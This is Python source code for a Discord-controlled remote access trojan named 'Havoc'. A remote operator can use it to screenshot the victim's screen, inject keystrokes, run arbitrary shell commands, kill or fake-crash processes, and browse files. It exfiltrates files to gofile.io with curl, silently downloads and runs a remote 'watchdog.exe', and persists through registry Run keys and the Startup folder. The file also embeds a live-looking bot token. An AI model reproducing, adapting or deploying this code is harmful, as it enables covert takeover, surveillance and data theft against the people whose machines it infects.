import win32api,win32con,win32gui,ctypes,time,string,subprocess,aiohttp,shutil,platform,os,requests,discord
from pynput.keyboard import Controller, Key
from discord.ext import commands
from PIL import Image, ImageDraw
import socket,tempfile,psutil
from json import loads, dumps
import pyautogui,threading
import psutil,random
import winreg as reg
import asyncio,sys

def crashproc(argname, ctx):
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == f'{argname}.exe':
                    proc.kill()
                    random_number = random.randint(1000, 9999)
                    random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                    random_message = f"Error code: 0x{random_string}{random_number}"
                    embed = discord.Embed(title=f"",description=f"<:havoc:1336789744721330186> **Crashed __{argname}.exe__. PID: __{proc.info['pid']}__**",color=0x242424)
                    asyncio.run_coroutine_threadsafe(ctx.channel.send(embed=embed), bot.loop)
                    ctypes.windll.user32.MessageBoxW(0, f"Crashed with {random_message}", "Error", 0x10 | 0x0)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        time.sleep(1)

TOKEN = "MTMzNjc4NzczNzIwOTk5NTM1NQ.GLzJ0x.xyfV3wmL_DGFnuzp3uDwFKpck586Cdirl0zUic"
PREFIX = "!"
INTENTS = discord.Intents.all()
DIR = "C:/"
bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS, help_command=None)
keyboard = Controller()
CHANNEL = None

@bot.event
async def on_ready():
    CHANNEL = bot.get_channel(1336788366875689044)
    embed = discord.Embed(title=f"**<:havoc:1336789642934095922> {os.getlogin()} connected with Havoc.**", description=f"<:havoc:1336789669941219408> {socket.gethostname()}", color=0x242424)
    await CHANNEL.send(embed=embed)
    channel = bot.get_channel(1337081021379907674)

@bot.command()
async def clear(ctx):
    await ctx.channel.purge(limit=None)
    embed = discord.Embed(title=f"", description=f"<:havoc:1336789740845797506> **Cleaned messages successfully.**", color=0x242424)
    await ctx.send(embed=embed, delete_after=15)

@bot.command()
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    border_width = 7
    border_color = (255, 255, 255)
    width, height = screenshot.size
    new_image = Image.new('RGB', (width + 2 * border_width, height + 2 * border_width), border_color)
    new_image.paste(screenshot, (border_width, border_width))
    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:
        temp_path = temp_file.name
        new_image.save(temp_path)
    embed = discord.Embed(title=f"",description=f"<:havoc:1336789647082389580> **Took a screenshot of {socket.gethostname()}´s display.**",color=0x242424)
    embed.set_image(url=f"attachment://{os.path.basename(temp_path)}")
    with open(temp_path, 'rb') as file:
        await ctx.send(embed=embed, file=discord.File(file, os.path.basename(temp_path)))
    os.remove(temp_path)

@bot.command()
async def press(ctx, *, key: str):
    try:
        key_map = {
            "enter": Key.enter,
            "space": Key.space,
            "esc": Key.esc,
            "backspace": Key.backspace,
            "f1": Key.f1, "f2": Key.f2, "f3": Key.f3, "f4": Key.f4,
            "f5": Key.f5, "f6": Key.f6, "f7": Key.f7, "f8": Key.f8,
            "f9": Key.f9, "f10": Key.f10, "f11": Key.f11, "f12": Key.f12,
            "shift": Key.shift, "ctrl": Key.ctrl, "alt": Key.alt
        }
        if key.lower() in key_map:
            keyboard.press(key_map[key.lower()])
            keyboard.release(key_map[key.lower()])
        else:
            keyboard.press(key)
            keyboard.release(key)
        embed = discord.Embed(title=f"",description=f"<:havoc:1336789740845797506> **Pressed key __{key}__**",color=0x242424)
        await ctx.send(embed=embed)

    except ValueError:
        embed = discord.Embed(title=f"",description=f"<:havoc:1336789702107332649> **Failed to press key __{key}__**",color=0x242424)

@bot.command()
async def crash(ctx, *, process):
    embed = discord.Embed(title=f"",description=f"<:havoc:1336789744721330186> **Crashing __{process}.exe__**",color=0x242424)
    threading.Thread(target=crashproc, args=(process, ctx)).start()
    await ctx.send(embed=embed)

@bot.command()
async def help(ctx):
    commands = bot.commands
    command_list = [command.name for command in commands]
    total_commands = len(command_list)
    embed = discord.Embed(title=f"",description=f"<:havoc:1336789719593255003> **Total Commands: {total_commands}**",color=0x242424)
    embed.add_field(name=f"> Help", value="```Shows all commands```", inline=False)
    embed.add_field(name=f"> Clear", value="```Clears the whole channel```", inline=False)
    embed.add_field(name=f"> Screenshot", value="```Screenshots his display```", inline=False)
    embed.add_field(name=f"> Press [KEY]", value="```Press a key```", inline=False)
    embed.add_field(name=f"> Crash [PROC]", value="```Fake crash process```", inline=False)
    embed.add_field(name=f"> Cd [DIR]", value="```Change directory```", inline=False)
    embed.add_field(name=f"> Ls", value="```List files and directorys```", inline=False)
    embed.add_field(name=f"> Network", value="```Shows IP informations```", inline=False)
    embed.add_field(name=f"> Processes", value="```List all running processes```", inline=False)
    embed.add_field(name=f"> Kill [PROC]", value="```Kill a process```", inline=False)
    embed.add_field(name=f"> Download [FILE]", value="```Download a file from his pc```", inline=False)
    embed.add_field(name=f"> Upload [URL] [SAVE]", value="```Uploads a file from a direct link```", inline=False)
    embed.add_field(name=f"> Opinfo", value="```Gets some pc informations```", inline=False)
    embed.add_field(name=f"> Startup", value="```Add the RAT to the startup```", inline=False)
    embed.add_field(name=f"> Remstartup", value="```Removes the RAT from the startup```", inline=False)
    embed.add_field(name=f"> Shell [CMD]", value="```Execute a cmd command```", inline=False)
    embed.add_field(name=f"> Watchdog", value="```Prevents the RAT from closing```", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def cd(ctx, *, path: str):
    global DIR
    if path == "..":
        DIR = os.path.dirname(DIR)
    else:
        new_path = os.path.join(DIR, path)
        if os.path.isdir(new_path):
            DIR = new_path
        else:
            embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Not found or permissions denied to access __{new_path}__**", color=0x242424)
            await ctx.send(embed=embed)
            return
    embed = discord.Embed(title="", description=f"<:havoc:1336789660755820675> **Current directory is now __{new_path}__**", color=0x242424)
    await ctx.send(embed=embed)

@bot.command()
async def watchdog(ctx):
    temp_dir = tempfile.gettempdir()
    url = "https://github.com/V3Katze/rosecleaner/raw/refs/heads/main/watchdog.exe"
    local_filename = os.path.join(temp_dir, os.path.basename(url))
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    file_content = await response.read()
                    temp_file_path = os.path.join(temp_dir, "watchdog.exe")
                    with open(temp_file_path, 'wb') as temp_file:
                        temp_file.write(file_content)
                    batch_file_path = os.path.join(temp_dir, "run_watchdog.bat")
                    openf = os.path.basename(sys.argv[0])
                    with open(batch_file_path, 'w') as batch_file:
                        batch_file.write(f'"{temp_file_path}" {openf}\n')
                    subprocess.Popen([batch_file_path], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
                    embed = discord.Embed(
                        title="", 
                        description=f"<:havoc:1336789656494411806> **Downloaded and executed __Watchdog.exe__**",
                        color=0x242424
                    )
                    await ctx.send(embed=embed)
                else:
                    raise Exception("Failed to download file")
    except Exception as e:
        embed = discord.Embed(
            title="", 
            description=f"<:havoc:1336789702107332649> **Failed to download or execute __Watchdog.exe__**",
            color=0x242424
        )
        await ctx.send(embed=embed)

@bot.command()
async def download(ctx, *, file):
    global DIR
    servers = requests.get("https://api.gofile.io/servers").json()["data"]["servers"]
    if servers:
        selected_server = servers[0]["name"]
        upload_url = f'https://{selected_server}.gofile.io/contents/uploadfile'
        gof = subprocess.Popen(f'curl -X POST "{upload_url}" -F "file=@{os.path.join(DIR, file)}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    embed = discord.Embed(title="", description=f"<:havoc:1336789723103887411> **Uploaded __{file}__. [GoFile]({loads(gof[0].decode('utf-8'))['data']['downloadPage']})**", color=0x242424)
    await ctx.send(embed=embed)

@bot.command()
async def shell(ctx, *, cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
        if result.stdout:
            embed = discord.Embed(title="", description=f"<:havoc:1336789740845797506> **Executed command __{cmd}__**", color=0x242424)
            embed.add_field(name="> Output", value=f"```{result.stdout}```")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="", description=f"<:havoc:1336789740845797506> **Successfully executed**", color=0x242424)
            await ctx.send(embed=embed)
    except subprocess.CalledProcessError as e:
        embed = discord.Embed(title="", description=f"<:havoc:1336789740845797506> **An error occured while executing command __{cmd}__**", color=0x242424)
        embed.add_field(name="> Exception", value=f"```{e.stderr}```")
        await ctx.send(embed=embed)

@bot.command()
async def upload(ctx, url, *, filename):
    global DIR
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                file_content = await response.read()
                temp_file_path = os.path.join(DIR, filename)
                with open(temp_file_path, 'wb') as temp_file:
                    temp_file.write(file_content)
                embed = discord.Embed(title="", description=f"<:havoc:1336789723103887411> **Downloaded __[File]({url})__ and saved as __{filename}__**", color=0x242424)
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Failed to download __[File]({url})__**", color=0x242424)
                await ctx.send(embed=embed)

@bot.command()
async def opinfo(ctx):
    system_info = {}
    system_info['System'] = platform.system()
    system_info['OS Version'] = platform.version()
    system_info['OS Release'] = platform.release()
    system_info['Architecture'] = 'x64' if platform.architecture()[0] == '64bit' else platform.architecture()[0]
    system_info['Machine'] = platform.machine()
    system_info['Processor'] = platform.processor()
    system_info['CPU Count (physical)'] = psutil.cpu_count(logical=False)
    system_info['CPU Count (logical)'] = psutil.cpu_count(logical=True)
    system_info['CPU Frequency'] = psutil.cpu_freq().current
    system_info['CPU Usage'] = psutil.cpu_percent(interval=1)
    try:
        temperatures = psutil.sensors_temperatures()
        if temperatures:
            system_info['CPU Temperature'] = str(temperatures.get('coretemp', [{}])[0].get('current', 'Not available')) + "°C"
        else:
            system_info['CPU Temperature'] = 'Not available'
    except Exception:
        system_info['CPU Temperature'] = 'Not available'
    virtual_memory = psutil.virtual_memory()
    system_info['Total RAM'] = round(virtual_memory.total / (1024 ** 3), 2)
    system_info['Available RAM'] = round(virtual_memory.available / (1024 ** 3), 2)
    system_info['Used RAM'] = round(virtual_memory.used / (1024 ** 3), 2) 
    system_info['RAM Usage'] = virtual_memory.percent
    disk_usage = psutil.disk_usage('/')
    system_info['Total Disk Space'] = round(disk_usage.total / (1024 ** 3), 2)
    system_info['Used Disk Space'] = round(disk_usage.used / (1024 ** 3), 2)
    system_info['Free Disk Space'] = round(disk_usage.free / (1024 ** 3), 2)
    system_info['Host Name'] = socket.gethostname()
    system_info['IP Address'] = socket.gethostbyname(system_info['Host Name'])
    net_if_addrs = psutil.net_if_addrs()
    system_info['Network Interfaces'] = ", ".join(net_if_addrs.keys())
    try:
        if platform.system() == "Windows":
            gpu_info = subprocess.check_output("wmic path win32_videocontroller get caption", shell=True)
            system_info['GPU'] = gpu_info.decode().split("\n")[1].strip()[:1000]
        elif platform.system() == "Linux":
            gpu_info = subprocess.check_output("lspci | grep VGA", shell=True)
            system_info['GPU'] = gpu_info.decode().strip()[:1000]
    except Exception:
        system_info['GPU'] = 'Not available'
    try:
        if platform.system() == "Windows":
            bios_info = subprocess.check_output("wmic bios get manufacturer, smbiosbiosversion, releasedate", shell=True)
            system_info['BIOS'] = bios_info.decode().split("\n")[1].strip()[:1000]
        elif platform.system() == "Linux":
            bios_info = subprocess.check_output("dmidecode -t 0", shell=True)
            system_info['BIOS'] = bios_info.decode().strip().split('\n')[0][:1000]
    except Exception:
        system_info['BIOS'] = 'Not available'
    system_info['User'] = os.getlogin()
    embed1 = discord.Embed(title="", color=0x242424)
    embed1.add_field(name="> Operating System Info", value=f"```System: {system_info['System']}\nOS Version: {system_info['OS Version']}\nOS Release: {system_info['OS Release']}\nArchitecture: {system_info['Architecture']}\nMachine: {system_info['Machine']}\nProcessor: {system_info['Processor']}```", inline=False)
    embed1.add_field(name="> CPU Info", value=f"```CPU Count (physical): {system_info['CPU Count (physical)']}\nCPU Count (logical): {system_info['CPU Count (logical)']}\nCPU Frequency: {system_info['CPU Frequency']} MHz\nCPU Usage: {system_info['CPU Usage']}%```", inline=False)
    if 'CPU Temperature' in system_info:
        embed1.add_field(name="> CPU Temperature", value=f"```CPU Temperature: {system_info['CPU Temperature']}```", inline=False)
    embed1.add_field(name="> RAM Info", value=f"```Total RAM: {system_info['Total RAM']} GB\nAvailable RAM: {system_info['Available RAM']} GB\nUsed RAM: {system_info['Used RAM']} GB\nRAM Usage: {system_info['RAM Usage']}%```", inline=False)
    embed1.add_field(name="> Disk Info", value=f"```Total Disk Space: {system_info['Total Disk Space']} GB\nUsed Disk Space: {system_info['Used Disk Space']} GB\nFree Disk Space: {system_info['Free Disk Space']} GB```", inline=False)
    embed1.add_field(name="> Network Info", value=f"```Host Name: {system_info['Host Name']}\nIP Address: {system_info['IP Address']}```", inline=False)
    await ctx.send(embed=embed1)
    embed2 = discord.Embed(title="", color=0x242424)
    embed2.add_field(name="> Network Interfaces", value=f"```{system_info['Network Interfaces']}```", inline=False)
    embed2.add_field(name="> GPU Info", value=f"```GPU: {system_info['GPU']}```", inline=False)
    embed2.add_field(name="> BIOS Info", value=f"```BIOS: {system_info['BIOS']}```", inline=False)
    embed2.add_field(name="> User Info", value=f"```User: {system_info['User']}```", inline=False)
    await ctx.send(embed=embed2)


@bot.command()
async def startup(ctx):
    exe_path = os.path.abspath(sys.argv[0])
    registry_paths = [
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\Startup",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
    ]
    
    root_keys = [reg.HKEY_CURRENT_USER, reg.HKEY_LOCAL_MACHINE]
    try:
        for root_key in root_keys:
            for path in registry_paths:
                if "RunOnce" not in path:
                    try:
                        reg_key = reg.OpenKey(root_key, path, 0, reg.KEY_WRITE)
                        reg.SetValueEx(reg_key, os.path.basename(exe_path), 0, reg.REG_SZ, f'"{exe_path}"')
                        reg.CloseKey(reg_key)
                        embed = discord.Embed(title="", description=f"<:havoc:1336789650584502272> **Added into registry path**", color=0x242424)
                        await ctx.send(embed=embed)
                    except FileNotFoundError:
                        pass
    except PermissionError:
        pass
    except Exception as e:
        embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Failed to add into registry paths**", color=0x242424)
        await ctx.send(embed=embed)
    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        exe_name = os.path.basename(exe_path)
        startup_exe_path = os.path.join(startup_folder, exe_name)
        shutil.copy(exe_path, startup_exe_path)
        embed = discord.Embed(title="", description=f"<:havoc:1336789650584502272> **Added to shell:startup**", color=0x242424)
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Failed to add to shell:startup**", color=0x242424)
        await ctx.send(embed=embed)

@bot.command()
async def remstartup(ctx):
    exe_path = os.path.basename(sys.argv[0])
    registry_paths = [
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\Startup",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
    ]
    root_keys = [reg.HKEY_CURRENT_USER, reg.HKEY_LOCAL_MACHINE]

    try:
        for root_key in root_keys:
            for path in registry_paths:
                try:
                    reg_key = reg.OpenKey(root_key, path, 0, reg.KEY_WRITE)
                    try:
                        reg.DeleteValue(reg_key, exe_path)
                        embed = discord.Embed(title="", description=f"<:havoc:1336789650584502272> **Removed autostart from registry path**", color=0x242424)
                        await ctx.send(embed=embed)
                    except FileNotFoundError:
                        pass
                except FileNotFoundError:
                    pass
                reg.CloseKey(reg_key)
    except PermissionError:
        pass
    except Exception as e:
        embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Failed to remove from registry paths**", color=0x242424)
        await ctx.send(embed=embed)
    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    startup_exe_path = os.path.join(startup_folder, exe_path)
    if os.path.exists(startup_exe_path):
        try:
            os.remove(startup_exe_path)
            embed = discord.Embed(title="", description=f"<:havoc:1336789650584502272> **Removed autostart from shell:startup**", color=0x242424)
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Failed to remove from shell:startup**", color=0x242424)
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="", description=f"<:havoc:1336789650584502272> **No program found in shell:startup to remove**", color=0x242424)
        await ctx.send(embed=embed)


@bot.command()
async def network(ctx):
    try:
        local_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
        response = requests.get(f'https://ipinfo.io/{local_ip}/json')
        ip_data = response.json()
        city = ip_data.get('city', 'Unknown')
        region = ip_data.get('region', 'Unknown')
        country = ip_data.get('country', 'Unknown')
        org = ip_data.get('org', 'Unknown')
        ip = ip_data.get('ip', 'Unknown')
        embed = discord.Embed(
            title="",
            description="<:havoc:1336789645622509579> **Network Informations**",
            color=0x242424
        )
        embed.add_field(name="> IP Address", value=f"```{ip}```", inline=False)
        embed.add_field(name="> Organisation", value=f"```{org}```", inline=False)
        embed.add_field(name="> City", value=f"```{city}```", inline=True)
        embed.add_field(name="> Region", value=f"```{region}```", inline=True)
        embed.add_field(name="> Country", value=f"```{country}```", inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="",
            description=f"<:havoc:1336789645622509579> **Error getting informations: __{e}__**",
            color=0x242424
        )

@bot.command()
async def ls(ctx):
    global DIR
    python_extensions = [".py", ".pyw", ".pyo", ".pyc"]
    java_extensions = [".java", ".class", ".jar"]
    javascript_extensions = [".js", ".mjs", ".cjs"]
    image_extensions = [".png", ".jpg", ".jpeg", ".gif"]
    video_extensions = [".mp4", ".mkv", ".avi"]
    executable_extensions = [".exe", ".bat", ".msi"]
    url_extensions = [".ink", ".url"]
    archive_extensions = [".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz", ".tbz2", ".lz", ".lzma", ".z", ".iso", ".apk", ".cab", ".deb", ".rpm", ".dmg", ".cpio", ".jar", ".war", ".arj", ".ace", ".lha", ".lzh", ".pkg", ".xz", ".s7z", ".zst"]
    embed = discord.Embed(title="", description=f"<:havoc:1336789740845797506> **Loading files and directorys in __{DIR}__**", color=0x242424)
    loadingmsg = await ctx.send(embed=embed)
    try:
        files = os.listdir(DIR)
        chunk_size = 25
        total_tabs = (len(files) // chunk_size) + (1 if len(files) % chunk_size > 0 else 0)
        if not files:
            embed = discord.Embed(title="", description=f"<:havoc:1336789740845797506> **No files found in __{DIR}__**", color=0x242424)
            await ctx.send(embed=embed)
            return
        for tab_number in range(total_tabs):
            start = tab_number * chunk_size
            end = start + chunk_size
            chunk = files[start:end]
            embed = discord.Embed(title="", description=f"<:havoc:1336789660755820675> **Files and directories in __{DIR}__ — Tab {tab_number + 1}/{total_tabs}**", color=0x242424)
            for file in chunk:
                file_path = os.path.join(DIR, file)
                total_size = 0
                if os.path.isfile(file_path):
                    total_size = os.path.getsize(file_path)
                elif os.path.isdir(file_path):
                    for dirpath, dirnames, filenames in os.walk(file_path):
                        for filename in filenames:
                            filepath = os.path.join(dirpath, filename)
                            total_size += os.path.getsize(filepath)
                size_mb = total_size / (1024 * 1024)
                file_extension = os.path.splitext(file)[-1].lower()
                if file_extension in python_extensions:
                    embed.add_field(name=f"> <:havoc:1337064055755636867> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in java_extensions:
                    embed.add_field(name=f"> <:havoc:1337064061925326982> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in javascript_extensions:
                    embed.add_field(name=f"> <:havoc:1337064060612771900> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in image_extensions:
                    embed.add_field(name=f"> <:havoc:1337064053918666874> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in video_extensions:
                    embed.add_field(name=f"> <:havoc:1337064053918666874> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in executable_extensions:
                    embed.add_field(name=f"> <:havoc:1337064064806948935> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in archive_extensions:
                    embed.add_field(name=f"> <:havoc:1336789660755820675> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                elif file_extension in url_extensions:
                    embed.add_field(name=f"> <:havoc:1336789645622509579> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
                else:
                    embed.add_field(name=f"> <:havoc:1336789719593255003> **{file}**", value=f'```{size_mb:.2f} MB```', inline=True)
            await loadingmsg.delete()
            await ctx.send(embed=embed)
    except FileNotFoundError:
        embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **__{DIR}__ not found**", color=0x242424)
        await loadingmsg.delete()
        await ctx.send(embed=embed)
    except PermissionError:
        embed = discord.Embed(title="", description=f"<:havoc:1336789702107332649> **Permissions denied to access __{DIR}__**", color=0x242424)
        await loadingmsg.delete()
        await ctx.send(embed=embed)


@bot.command()
async def processes(ctx):
    processes_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes_list.append((proc.info['name'], proc.info['pid']))
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    chunk_size = 25
    total_tabs = (len(processes_list) // chunk_size) + (1 if len(processes_list) % chunk_size > 0 else 0)
    if not processes_list:
        embed = discord.Embed(title="", description=f"<:havoc:1336789740845797506> **No processes found**", color=0x242424)
        await ctx.send(embed=embed)
        return
    for tab_number in range(total_tabs):
        start = tab_number * chunk_size
        end = start + chunk_size
        chunk = processes_list[start:end]
        embed = discord.Embed(title="", description=f"<:havoc:1336789656494411806> **Processes running on {socket.gethostname()} — Tab {tab_number + 1}/{total_tabs}**", color=0x242424)
        for process_name, pid in chunk:
            embed.add_field(name=f"> **{process_name}**", value=f"""```{pid}```""", inline=True)
        await ctx.send(embed=embed)

@bot.command()
async def kill(ctx, identifier: str):
    try:
        if identifier.isdigit():
            pid = int(identifier)
            proc = psutil.Process(pid)
            proc.terminate() 
            embed = discord.Embed(title="", description=f"<:havoc:1336789705424900249> Process __{pid}__ terminated", color=0x242424)
            await ctx.send(embed=embed)
        else:
            killed = False
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == f'{identifier.lower()}.exe':
                    proc.terminate()
                    killed = True
                    break
            if killed:
                embed = discord.Embed(title="", description=f"<:havoc:1336789705424900249> Process __{identifier}.exe__ terminated", color=0x242424)
            else:
                embed = discord.Embed(title="", description=f"<:havoc:1336789641696645200> Process __{identifier}.exe__ not found", color=0x242424)
            await ctx.send(embed=embed)
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        embed = discord.Embed(title="", description=f"<:havoc:1336789705424900249> Not enough priviliges to terminate __{identifier}.exe__", color=0x242424)
        await ctx.send(embed=embed)
    except ValueError:
        embed = discord.Embed(title="", description=f"<:havoc:1336789705424900249> Process __{identifier}.exe__ not found", color=0x242424)
        await ctx.send(embed=embed)

bot.run(TOKEN)
